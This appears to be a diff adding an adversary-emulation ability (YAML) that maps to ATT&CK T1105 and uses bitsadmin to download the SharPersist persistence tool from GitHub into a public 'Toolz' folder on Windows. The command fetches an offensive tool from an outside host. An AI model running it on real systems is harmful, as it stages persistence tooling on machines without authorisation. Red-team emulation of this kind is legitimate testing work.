@@ -1,0 +1,23 @@
+- name: Donwload SharPersist using Bitsadmin
+  description: This ability creates a hidden directory and download SharPersist using
+    bigtsadmin
+  tactic: command-and-control
+  technique_id: T1105
+  technique_name: Ingress Tool Transfer
+  executors:
+  - payloads: []
+    platform: windows
+    name: psh
+    cleanup: []
+    parsers: []
+    command: "bitsadmin  /transfer DonwloadJob /download /priority normal https://github.com/mandiant/SharPersist/releases/download/v1.0.1/SharPersist.exe $env:PUBLIC\\Toolz\\SharPersist.exe"
+    timeout: '60'
+  repeatable: false
+  additional_info: {}
+  privilege: ''
+  singleton: true
+  buckets: []
+  requirements: []
+  access: {}
+  cleanup: []
+  id: bitsadmin_downloads_sharpersist
